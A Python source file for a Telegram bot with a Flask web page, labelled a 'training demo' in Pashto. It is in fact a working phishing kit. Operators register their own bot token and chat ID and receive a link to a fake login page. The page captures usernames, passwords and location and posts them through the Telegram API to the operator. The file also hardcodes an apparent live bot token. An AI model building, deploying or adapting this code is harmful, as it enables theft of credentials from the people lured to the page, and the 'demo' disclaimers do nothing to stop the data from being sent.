import requests
from flask import Flask, request, render_template_string
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
import threading

# ================= CONFIG =================
MAIN_BOT_TOKEN = "7975528068:AAG3llP9evape74taVzaEfJORpu1PMCuiFI"
WEB_PORT = 8081
PUBLIC_URL = "http://YOUR_PUBLIC_IP_OR_DOMAIN:8081"

user_sessions = {}

# ================= KEYBOARD =================
MAIN_KEYBOARD = ReplyKeyboardMarkup(
    [
        ["🧪 Demo Login", "📷 Camera Demo"],
        ["ℹ️ Disclaimer", "🆘 Help"]
    ],
    resize_keyboard=True
)

# ================= TELEGRAM BOT =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 سلام!\n"
        "دا **Training / Demo Bot** دی\n\n"
        "👇 له مینو څخه انتخاب وکړه",
        reply_markup=MAIN_KEYBOARD
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🆘 Help\n\n"
        "1️⃣ Demo Login: د Demo فورم لینک\n"
        "2️⃣ Camera Demo: یوازې Demo پیغام\n"
        "3️⃣ Disclaimer: قانوني معلومات\n\n"
        "❗ ریښتینی معلومات مه داخلوئ",
        reply_markup=MAIN_KEYBOARD
    )

async def disclaimer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚠️ Disclaimer\n\n"
        "دا سیستم یوازې د زده‌کړې او UI Demo لپاره دی.\n"
        "ریښتینی حساب، پاسورډ، یا شخصي معلومات مه داخلوئ.\n"
        "هیڅ ریښتینی لاګین یا کیمره نه کارېږي.",
        reply_markup=MAIN_KEYBOARD
    )

async def camera_demo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📷 Camera Demo\n\n"
        "دا یوازې Demo دی.\n"
        "هیڅ عکس نه اخلو، هیڅ کیمره نه فعاله کېږي.\n\n"
        "✅ قانوني او خوندي",
        reply_markup=MAIN_KEYBOARD
    )

async def demo_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    context.user_data["step"] = "name"
    await update.message.reply_text(
        "🧪 Demo Login\n\n"
        "مهرباني وکړه خپل **نوم** ولیکه",
        reply_markup=MAIN_KEYBOARD
    )

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text
    step = context.user_data.get("step")

    if text == "🧪 Demo Login":
        return await demo_login(update, context)
    if text == "📷 Camera Demo":
        return await camera_demo(update, context)
    if text == "ℹ️ Disclaimer":
        return await disclaimer(update, context)
    if text == "🆘 Help":
        return await help_cmd(update, context)

    if step == "name":
        user_sessions[uid] = {"name": text}
        context.user_data["step"] = "token"
        await update.message.reply_text("🤖 اوس د **دوهم Bot TOKEN** ولیکه")

    elif step == "token":
        user_sessions[uid]["bot_token"] = text
        context.user_data["step"] = "chatid"
        await update.message.reply_text("🆔 اوس د **دوهم Bot CHAT ID** ولیکه")

    elif step == "chatid":
        user_sessions[uid]["chat_id"] = text
        link = f"{PUBLIC_URL}/demo?uid={uid}"
        context.user_data["step"] = None
        await update.message.reply_text(
            "✅ هر څه تیار شول!\n\n"
            f"🔗 Demo Link:\n{link}\n\n"
            "⚠️ دا Demo دی، ریښتینی معلومات مه داخلوئ",
            reply_markup=MAIN_KEYBOARD
        )

# ================= FLASK WEB =================
app = Flask(__name__)

HTML_PAGE = """
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Demo Login</title>
</head>
<body>
<h3>🧪 Demo Login Page</h3>
<p style="color:red;">
⚠️ دا تعلیمي Demo دی<br>
ریښتینی یوزرنیم یا پاسورډ مه داخلوئ
</p>

<form method="post">
<input name="username" placeholder="Demo Username"><br><br>
<input name="password" placeholder="Demo Password"><br><br>

<select name="country">
<option>Afghanistan</option>
<option>Pakistan</option>
<option>Iran</option>
</select><br><br>

<select name="province">
<option>Kabul</option>
<option>Nangarhar</option>
<option>Herat</option>
</select><br><br>

<button type="submit">Submit Demo</button>
</form>
</body>
</html>
"""

@app.route("/demo", methods=["GET", "POST"])
def demo():
    uid = int(request.args.get("uid"))
    if request.method == "POST":
        session = user_sessions.get(uid)
        data = request.form

        msg = (
            "🧪 Demo Data\n\n"
            f"👤 Name: {session['name']}\n"
            f"📛 Demo Username: {data['username']}\n"
            f"🔑 Demo Password: {data['password']}\n"
            f"🌍 Country: {data['country']}\n"
            f"📍 Province: {data['province']}\n\n"
            "⚠️ Demo Only"
        )

        url = f"https://api.telegram.org/bot{session['bot_token']}/sendMessage"
        requests.post(url, json={"chat_id": session["chat_id"], "text": msg})
        return "✅ Demo Data Sent"

    return render_template_string(HTML_PAGE)

# ================= RUN BOTH =================
def run_flask():
    app.run(host="0.0.0.0", port=WEB_PORT)

def run_bot():
    tg = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()
    tg.add_handler(CommandHandler("start", start))
    tg.add_handler(MessageHandler(filters.TEXT, text_handler))
    tg.run_polling()

threading.Thread(target=run_flask).start()
run_bot()
